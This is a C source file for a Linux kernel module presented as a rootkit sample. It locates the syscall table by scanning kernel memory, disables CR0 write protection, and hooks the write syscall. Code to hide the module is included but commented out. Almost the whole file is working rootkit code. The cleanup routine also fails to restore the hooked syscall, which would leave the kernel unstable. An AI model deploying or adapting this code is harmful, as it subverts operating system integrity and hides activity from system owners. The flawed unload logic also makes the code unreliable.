/*
 * sys_call_hijack.c - sample for a simple LKM rootkit
 *
 * Copyright (C) 2015 Max Schrimpf. Based on a tutorial by Tyler Borland.
 *
 *This project is free software: You can redistribute it and/or 
 * modify it under the terms of the European Union Public Licence (EUPL v.1.1) 
 * or – as soon they will be approved by the European 
 * Commission - subsequent versions of the EUPL (the "Licence"); 
 * You may not use this work except in compliance with the Licence.
 * 
 * The project is distributed in the hope that it will be useful, 
 * but WITHOUT ANY WARRANTY; without even the implied warranty of 
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the 
 * Licence for the specific language governing permissions and 
 * limitations under the Licence.
 *
 * You should have received a copy of the GNU General Public License
 * along with this project; if not, see <http://ec.europa.eu/idabc/eupl.html>.
 */
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>

#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK 0xd0000000
typedef unsigned int psize;
#else
#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef unsigned long psize;
#endif

asmlinkage ssize_t (*original_write)(int fd, const char __user *buff, ssize_t count);

psize *sys_call_table;

/*
 * Bruteforde find of sys_table in kernel memory
 */
psize **find_sys_tab(void) {
  psize **sctable;
  psize i = START_CHECK;
  while (i < END_CHECK) {
    sctable = (psize **) i;
    if (sctable[__NR_close] == (psize *) sys_close) {
      return &sctable[0];
    }
    i += sizeof(void *);
  }
  return NULL;
}

/*
 * Hijacked sys_call
 */
asmlinkage ssize_t hijack_write(int fd, const char __user *buff, size_t count) {
  int to_return; 
  char *proc_protect = ".evil"; 
  char *kbuff = (char *) kmalloc(256,GFP_KERNEL); 
  copy_from_user(kbuff,buff,255); 
  if (strstr(kbuff,proc_protect)) { 
    kfree(kbuff); 
    return EEXIST; 
  }
  to_return = (*original_write)(fd,buff,count);
  kfree(kbuff);
  return to_return;
}

int hijack_init(void) {
  printk("hijack: LKM loaded\n");

//  list_del_init(&__this_module.list);
// kobject_del(&THIS_MODULE->mkobj.kobj);
  printk("hijack: LKM hidden\n");

  if ((sys_call_table = (psize *) find_sys_tab())) {
    printk("hijack: sys_call_table found at %p\n",sys_call_table);
  } else {
    printk("hijack: sys_call_table not found\n");
  }

  printk("bla: LKM hidden\n");
  write_cr0(read_cr0() & (~ 0x10000));
  printk("hijack: cr0 write protection removed\n");

  original_write = (void *) xchg(&sys_call_table[__NR_write],hijack_write);
  printk("hijack: exchanged original sys_call with hijacked\n");

  write_cr0(read_cr0() | 0x10000); 
  printk("hijack: cr0 write protection activated\n");

  return 0;
}

void hijack_exit(void) {
  write_cr0(read_cr0() & (~ 0x10000)); 
  printk("hijack: cr0 write protection removed\n");

//  xchg(&sys_call_table[__NR_write],original_write);
  printk("hijack: exchanged hijacked sys_call with original\n");

  write_cr0(read_cr0() | 0x10000);
  printk("hijack: cr0 write protection activated\n");

  printk("hijack: LKM removed\n");
}

MODULE_LICENSE("EUPL");
MODULE_AUTHOR("Max Schrimpf");
MODULE_DESCRIPTION("Syscall hijacking by a rootkit example");
module_init(hijack_init);
module_exit(hijack_exit);
